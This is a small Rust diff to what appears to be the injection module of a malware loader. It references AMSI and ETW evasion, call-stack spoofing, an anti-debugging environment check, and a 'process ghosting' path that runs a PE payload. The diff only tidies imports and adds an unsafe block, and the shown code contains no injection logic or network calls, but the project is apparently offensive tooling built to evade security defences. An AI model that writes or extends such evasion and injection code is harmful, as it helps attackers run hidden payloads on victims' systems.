@@ -1,14 +1,11 @@
 pub mod ghosting;
 
-use core::ffi::c_void;
 
 use crate::debug;
-use crate::core::nt;
-use crate::core::types::*;
 use crate::core::{amsi, etw, spoof};
 
 
-pub unsafe fn execute(config: ghosting::Config) -> bool {
+pub unsafe fn execute(config: ghosting::Config) -> bool { unsafe {
     debug!("[INJECTION] Environment hardening");
     
     if !crate::core::anti_debug::is_safe_environment() { return false; }
@@ -23,4 +20,4 @@ pub unsafe fn execute(config: ghosting::Config) -> bool {
     if !config.enable_ghosting || config.pe_payload.is_empty() { return false; } 
 
     true    
-}
+}}
